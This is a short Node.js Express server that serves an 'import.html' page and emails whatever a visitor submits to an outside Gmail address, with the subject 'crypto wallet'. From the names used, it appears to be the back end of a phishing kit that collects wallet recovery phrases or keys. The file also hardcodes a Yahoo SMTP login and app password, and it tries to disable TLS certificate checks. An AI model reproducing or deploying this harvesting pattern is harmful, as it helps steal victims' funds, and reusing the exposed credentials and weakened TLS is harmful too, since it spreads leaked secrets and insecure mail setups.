const express = require("express")
const bodyParser = require("body-parser")
const exphbs = require("express-handlebars")
const nodemailer =  require("nodemailer")
const path = require("path")
const app = express()

//view engine setup


app.set("view engine", "handlebars")


//static folder

app.use("/public", express.static(path.join(__dirname, "public")))

//bodyparser middlewares

app.use(bodyParser.urlencoded({extended: false}))
app.use(bodyParser.json())



app.get("/", (req, res)=>{
    res.sendFile(__dirname + "/import.html")
})


app.post("/send", (req, res)=>{
const output = `
<p> You have a new contact request</p>
<h3> Contact Details</h3>
<ul>

<li> Name: ${req.body.text} </li>






</ul>


`;

// create reusable transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
    host: "smtp.mail.yahoo.com",
    port: 465,
    secure: true, // true for 465, false for other ports
    auth: {
      user: "obianefomicheal@yahoo.com", // generated ethereal user
      pass: "rpfjzjuamamcimdx", // generated ethereal password
    },
      tls:{
        rejectunauthorized: false
    }
  });

  // send mail with defined transport object
  let mailOptions = {
    from: '"Nodemailer contact" <obianefomicheal@yahoo.com>', // sender address
    to: "obalola1960@gmail.com, ", // list of receivers
    subject: "crypto wallet", // Subject line
    text: "Hello world?", // plain text body
    html: output, // html body
  };

  transporter.sendMail(mailOptions, (error, info)=>{
      if(error){
          return console.log(error)
      }

      res.sendFile(__dirname + "/success.html")
      console.log("Message sent: ", info.messageId);
      console.log("preview URL: ", nodemailer.getTestMessageUrl(info));
    
  })

})










app.listen(process.env.port||3000, ()=>{
    console.log("server is running ")
})